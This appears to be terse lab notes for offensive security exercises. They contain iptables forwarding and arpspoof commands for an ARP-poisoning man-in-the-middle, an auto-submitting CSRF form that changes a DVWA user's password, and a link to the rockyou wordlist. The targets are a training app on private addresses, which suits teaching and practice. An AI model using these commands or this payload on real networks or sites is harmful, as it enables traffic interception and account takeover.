# cyberlabcodes
test
deb http://http.kali.org/kali kali-rolling main contrib non-free
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5


sudo sysctl -w net.ipv4.ip_forward=1

cat /proc/sys/net/ipv4/ip_forward

sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

sudo iptables -A FORWARD -i eth0 -j ACCEPT

sudo arpspoof -i eth0 -t 192.168.128.2 192.168.128.1

<body onload="document.forms[0].submit()">
<form action="http://192.168.128.2/dvwa/vulnerabilities/csrf/">
  <input type="hidden" name="password_new"  value="cracked123">
  <input type="hidden" name="password_conf" value="cracked123">
  <input type="hidden" name="Change"        value="Change">
</form>
</body>


https://github.com/brannondorsey/naive-hashcat/blob/master/rockyou.txt
